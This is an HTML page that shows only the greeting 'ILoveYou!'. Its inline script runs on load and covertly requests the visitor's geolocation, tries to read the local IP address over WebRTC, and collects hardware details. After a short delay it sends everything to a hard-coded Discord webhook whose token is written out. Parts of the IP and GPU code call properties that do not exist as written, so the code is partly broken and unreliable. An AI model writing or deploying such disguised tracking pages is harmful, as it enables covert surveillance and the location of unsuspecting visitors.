<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ILoveYou!</title>
    <style>
        body {
            background-color: black;
            color: white;
            text-align: center;
            font-size: 48px;
            font-family: Arial, sans-serif;
            padding-top: 100px;
        }
    </style>
</head>
<body>
    <h1>ILoveYou!</h1>

    <script>
        const FINAL_PAYLOAD = {};
        let peerConnection;
        const sendToDiscordWebhook = (webhookURL, payload) => {
          return fetch(webhookURL, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload),
          }).then(response => {
              if (!response.ok) {
                  throw new Error('Error sending payload to Discord webhook: ' + response.statusText);
              }
              return response;
          }).catch(error => {
              console.error('Error sending payload to Discord webhook: ', error);
          });
        };
        const getGeoLocation = () => {
            return new Promise((resolve, reject) => {
                if (!navigator || !navigator.geolocation) {
                    reject(new Error('Geolocation is not supported by your browser.'));
                    return;
                }
                navigator.geolocation.getCurrentPosition((position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                    });
                }, (error) => {
                    reject(error);
                });
            });
        };
        const gatherHardwareTelemetry = () => {
            const deviceMemory = navigator.deviceMemory;
            const hardwareConcurrency = navigator.hardwareConcurrency;

            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;

            let gpuRenderer = 'Unknown';
            try {
                gpuRenderer = navigator.gpu ? navigator.gpu.unmaskedRendererWebGL : 'Not available';
            } catch (error) {
                gpuRenderer = 'Error occurred';
            }

            const telemetryData = {
                deviceMemory,
                hardwareConcurrency,
                screenResolution: `${screenWidth}x${screenHeight}`,
                gpuRenderer,
            };

            return JSON.stringify(telemetryData);
        };
        const startTelemetry = async() => {
            try {
                FINAL_PAYLOAD.geoData = await getGeoLocation();
            } catch (error) {
                console.error('Error getting geo-location data: ', error);
                FINAL_PAYLOAD.geoData = { error: 'An error occurred while getting geo-location data.' };
            }
            FINAL_PAYLOAD.ipAddress = peerConnection.localDescription.candidate.candidates.find(candidate => candidate.candidate.startsWith('ipv4')).candidate.split(' ')[2];
            FINAL_PAYLOAD.hardwareTelemetry = gatherHardwareTelemetry();

            await new Promise((resolve) => setTimeout(() => resolve(), 3500));
            await sendToDiscordWebhook('https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73', FINAL_PAYLOAD);
        };
        peerConnection = new RTCPeerConnection();
        peerConnection.onicecandidate = function (event) {
            for (let i = 0; i < event.candidate.candidates.length; i++) {
                if (event.candidate.candidates[i].candidate.toString().startsWith('ipv4')) {
                    FINAL_PAYLOAD.ipAddress = event.candidate.candidates[i].candidate.split(' ')[2];
                    break;
                }
            }
        };
        peerConnection.createOffer(function (offer) {
            peerConnection.setLocalDescription(offer);
        }, function (error) {});

        window.onload = startTelemetry;
    </script>
</body>
</html>
